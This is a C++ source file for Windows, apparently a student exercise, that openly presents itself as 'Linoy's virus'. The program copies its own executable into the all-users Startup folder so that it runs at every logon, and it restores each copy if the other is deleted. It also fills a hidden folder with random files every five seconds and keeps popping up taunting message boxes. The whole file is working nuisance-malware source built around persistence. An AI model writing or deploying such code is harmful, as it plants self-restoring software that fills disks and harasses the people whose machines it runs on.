#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <random>
#include <chrono>
#include <fstream>

void DisplayResourceNAMessageBox();
void createRandomFile(char path[]);
std::string printRandomString();
void binaryCopy(char* src, char* dst);

int main()
{
    srand(time(NULL));
    struct stat info {};
    char path[] = "C:\\Virus Folder";
    char src[] = "Debug\\ex10_LinoyYazdi.exe";
    char dest[] = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\app.exe";
    char filepath[MAX_PATH] = {};
    std::ifstream file;

    GetModuleFileNameA(NULL, filepath, MAX_PATH);
    if (std::string(filepath).find(std::string("Debug\\ex10_LinoyYazdi.exe")) != std::string::npos)
    {
        file.open(dest);
        if (!file.is_open())
        {
            file.close();
            binaryCopy(src, dest);
        }
        else
        {
            file.close();
            remove(dest);
            binaryCopy(src, dest);
        }
        ShellExecute(NULL, L"open", L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\app.exe", NULL, NULL, NULL);
    }

    while (true)
    {
        if (stat(path, &info) != 0) // folder doesn't exists
        {
            LPCWSTR folder = L"C:\\Virus Folder";
            CreateDirectory(folder, NULL); // creates folder
            SetFileAttributes(folder, FILE_ATTRIBUTE_HIDDEN); // making it a hidden folder
        }

        file.open(dest);
        if (!file.is_open())
        {
            file.close();
            binaryCopy(src, dest);
        }

        else
        {
            file.close();
            file.open(src);
            if (!file.is_open())
            {
                file.close();
                binaryCopy(dest, src);
            }
        }
        createRandomFile(path); // creating a file with random data
        DisplayResourceNAMessageBox(); // showing the msg box

        Sleep(5 * 1000); // 1 sec -> 1000 miliseconds
    }

    return 0;
}


/*
This function displays a message box
input: none
output: none
*/
void DisplayResourceNAMessageBox()
{
    int msgboxID = MessageBox(
        NULL,
        (LPCWSTR)L"Welcome to Linoy's virus\nI hope you'll like me because I wanna stay here for a while\nDo you want to try again?",
        (LPCWSTR)L"Virus Details",
        MB_ICONERROR | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
    );

    switch (msgboxID)
    {
    case IDCANCEL:
        MessageBox(
            NULL,
            (LPCWSTR)L"Stop canceling me smh -_-",
            (LPCWSTR)L"Cancel", NULL);
        break;
    case IDTRYAGAIN:
        MessageBox(
            NULL,
            (LPCWSTR)L"Nice try :)",
            (LPCWSTR)L"Try again", NULL);
        break;
    case IDCONTINUE:
        MessageBox(
            NULL,
            (LPCWSTR)L"Fine i'll continue to spam you <3",
            (LPCWSTR)L"Continue", NULL);
        break;
    }
}


/*
This function creates a file with random data
input: the path of the folder to generate the file into
output: none
*/
void createRandomFile(char path[])
{
    // create a random engine
    std::default_random_engine URNG{ };

    // let's seed the sucker using a seed sequence
    // seed using either std::random_device or the system clock if random_device isn't available
    std::seed_seq::result_type seeds[]{ std::random_device {}(),
                                         std::seed_seq::result_type(std::chrono::system_clock::now().time_since_epoch().count()) };

    // create the seed sequence
    std::seed_seq sseq(std::begin(seeds), std::end(seeds));

    // seed the random engine
    URNG.seed(sseq);

    // create a distribution 100 - 200 inclusive
    std::uniform_int_distribution<unsigned> DIST(100, 200);

    // how many random numbers do you want?
    const unsigned num_rnd = 1000;

    std::string fileName = path;
    fileName.append("\\");
    fileName.append(printRandomString());
    fileName.append(".txt");
    // open the file for writing
    std::ofstream file(fileName);

    // skip count
    const unsigned count{ 10 };

    for (size_t loop = 0; loop < num_rnd; loop++)
    {
        // get a random number
        unsigned num{ DIST(URNG) };

        file << num << ' ';

        if (((loop + 1) % count) == 0) { file << '\n'; }
    }

    file.close();
}


/*
This function generates a random 5 chars string
input: none
output: the string
*/
std::string printRandomString()
{
    const int MAX = 26;
    char alphabet[MAX] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g',
                          'h', 'i', 'j', 'k', 'l', 'm', 'n',
                          'o', 'p', 'q', 'r', 's', 't', 'u',
                          'v', 'w', 'x', 'y', 'z' };

    std::string res = "";
    for (int i = 0; i < 5; i++)
        res = res + alphabet[rand() % MAX];

    return res;
}


void binaryCopy(char* src, char* dst)
{
    FILE* srcFile = 0;
    FILE* destFile = 0;
    char returnedChar = 0;

    srcFile = fopen(src, "rb");
    destFile = fopen(dst, "wb");

    fread(&returnedChar, 1, 1, srcFile);
    while (!(feof(srcFile)))
    {
        fwrite(&returnedChar, 1, 1, destFile);
        fread(&returnedChar, 1, 1, srcFile);
    }

    fclose(srcFile);
    fclose(destFile);
}